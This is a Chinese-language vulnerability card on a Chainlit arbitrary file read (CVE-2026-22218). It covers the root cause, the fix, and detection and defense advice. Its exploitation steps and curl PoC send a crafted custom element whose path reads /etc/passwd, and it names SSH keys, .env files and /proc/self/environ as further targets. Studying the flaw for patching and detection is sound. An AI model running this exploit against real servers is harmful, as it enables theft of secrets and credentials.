---
id: ai-security-agent-security-chainlit-custom-element-path-arbitrary-file-read
title: Chainlit <2.9.4 /project/element 任意文件读取：custom element path 直达数据层后被 /project/file 取回
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: chainlit-custom-element-path-arbitrary-file-read
aliases:
- CVE-2026-22218
- Chainlit 任意文件读取
- /project/element
- custom element path
- chainlitKey 文件读取
tags:
- ai-security
- agent-security
- chainlit
- file-read
- path-traversal
- cve-2026-22218
cve:
- CVE-2026-22218
severity: high
confidence: high
status: verified
affected_versions: < 2.9.4
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T09:46:34+08:00'
  notes: 已对照原文与10张图核对：NVD CVE-2026-22218/2.9.4前/CVSS7.1、server.py update_thread_element 仅放行 custom、Element.from_dict 取 path、CustomElement.update→send→_create→SQLAlchemyDataLayer.create_element 的 aiofiles.open(element.path) 读文件均与图一致；修复 commit ffc3cce 与 _sanitize_custom_element 一致。小差异：chainlitKey 实际由 _create 内 context.session.persist_file 生成（图08），卡内表述为数据层持久化返回，不影响链路成立。未验证点：PoC 未在本机对真实实例复跑；认证会话获取方式原文未展开。
---

## 一句话结论

Chainlit `< 2.9.4` 的 `PUT /project/element` 更新流程信任客户端提交的 `element.path`：认证客户端发送 `type=custom` 的元素并把 `path` 设为 `/etc/passwd`，服务端 `Element.from_dict()` 把该路径放进 `CustomElement`，`element.update() → send() → _create()` 再交给数据层 `create_element(self)`，`SQLAlchemyDataLayer.create_element` 直接 `aiofiles.open(element.path, "rb")` 读取文件；返回的 `chainlitKey` 可用于 `GET /project/file/<chainlitKey>` 取回内容，从而读取 Chainlit 进程可读的任意文件。

## 原理

- **入口信任客户端字段**：`server.py` 的 `update_thread_element()` 从 `payload.element` 取 `ElementDict`，只检查 `type == "custom"`，随后 `Element.from_dict(element_dict)`。后者执行 `path = str(e_dict.get("path")) if e_dict.get("path") else None`，把客户端传入的 `path` 原样保存。
- **custom 分支**：`Element.from_dict` 在 `type == "custom"` 时返回 `CustomElement(props=..., **common_params)`，`common_params` 包含 `path=path`；`CustomElement.update()` 调用 `super().send(self.for_id)`。
- **持久化触发读文件**：`Element.send()` 调用 `await self._create(persist=persist)`；`_create()` 在 `data_layer` 存在时执行 `data_layer.create_element(self)`。
- **数据层读文件**：`SQLAlchemyDataLayer.create_element(self, element)` 判断 `if element.path:`，然后 `async with aiofiles.open(element.path, "rb") as f: content = await f.read()`；`element.path` 完全来自攻击者。
- **取回**：数据层把文件内容持久化并返回/生成 `chainlitKey`；攻击者用 `GET /project/file/<chainlitKey>` 下载该文件。因此形成“写路径 → 读文件 → 以元素文件形式取回”的完整任意文件读取链。
- **认证要求**：CVE 描述为“认证客户端”；攻击者需要有效 Chainlit 会话（`session_id`），但不需要管理员权限。影响范围是 Chainlit 服务进程可读的文件（`.env`、配置文件、SSH key、云凭据、源码等）。
- **修复**：`_sanitize_custom_element()` 只从客户端字典取安全字段（`id`、`forId`、`threadId`、`name`、`props`、`display`），不再把 `path`/`url` 传入；升级到 `2.9.4`。

## 触发条件

- Chainlit 版本 `< 2.9.4`，使用 SQLAlchemy/Aiofiles 数据层（或同样信任 `element.path` 的 data layer）。
- 攻击者能获得/伪造有效 Chainlit 会话（`session_id`），可访问 `PUT /project/element`。
- 目标文件对 Chainlit 进程可读；服务端未对 `path` 做目录限制/规范化。
- `/project/file/<chainlitKey>` 可访问（认证/会话条件满足）。

## 利用步骤

1. 登录/获取 Chainlit 会话，记录 `session_id`。
2. 发送更新元素请求，把 `path` 指向目标文件：
   ```http
   PUT /project/element HTTP/1.1
   Host: target-chainlit.com
   Content-Type: application/json
   Cookie: session_id=<valid>

   {"element":{"type":"custom","id":"file-read-001","name":"profile","display":"inline","path":"/etc/passwd","props":{},"sessionId":""}}
   ```
3. 服务端返回 `{"success": true}`；通过响应/WebSocket `element` 事件取得 `chainlitKey`（或 `id`）。
4. 请求 `GET /project/file/<chainlitKey>` 下载文件内容。
5. 对敏感文件重复：`/proc/self/environ`、应用 `.env`、`~/.ssh/id_rsa`、云凭据、数据库配置等。
6. 授权测试只读取自建测试文件；不要读取真实用户数据。

## PoC

```bash
# 1) 发送 custom element，path 指向目标文件
curl -s -X PUT 'https://target-chainlit.com/project/element' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session_id=<valid>' \
  -d '{"element":{"type":"custom","id":"file-read-001","name":"profile","display":"inline","path":"/etc/passwd","props":{},"sessionId":""}}'

# 2) 从响应/WS 事件拿到 chainlitKey 后取回
curl -s 'https://target-chainlit.com/project/file/<chainlitKey>'
```

说明：PoC 按原文的请求包与调用链重写；需要有效会话，未在本机对真实实例复跑。

## 变体与关联

- **其他元素类型**：`file`/`image`/`audio`/`video` 等也可能携带 `path`；若数据层同样按 `path` 读取，可形成类似链。
- **路径变体**：绝对路径、`../`、符号链接、`/proc/self/root/...`；修复前关键是 `open()` 直接使用客户端路径，绕不绕目录取决于进程权限。
- **数据层差异**：SQLAlchemy/Aiofiles 是原文实现；其他 data layer（S3、本地盘）若把 `path` 当本地路径也会受影响。
- **关联**：[[ai-security-agent-security-file-read-tool-symlink-realpath-bypass]]（Agent 文件读取工具的符号链接绕过）、[[web-generic-file-inclusion-gitlab-commits-api-file-path-unauth-read]]（API 信任 file.path 的任意文件读取）。

## 检测与防御

- **升级**：Chainlit 升级到 `2.9.4` 或更高；确认 `_sanitize_custom_element` 已生效，客户端不能控制 `path`/`url`。
- **输入校验**：服务端对元素路径做规范化/白名单，只允许预定义目录；不要把客户端路径直接传给 `open()`；用服务端生成的文件 ID 代替路径。
- **权限**：Chainlit 进程以最小权限运行，限制可读文件（容器只读根、独立用户、密钥挂载权限）。
- **检测**：审计 `PUT /project/element` 中 `type=custom` 且 `path` 为敏感路径的请求；监控 `GET /project/file/*` 的异常下载；WAF 拦截 `/etc/passwd`、`../`、`.env` 等模式。
- **响应**：若已暴露，轮换 Chainlit 可读的密钥/凭据，检查 `/project/file` 访问日志，升级并限制会话获取。
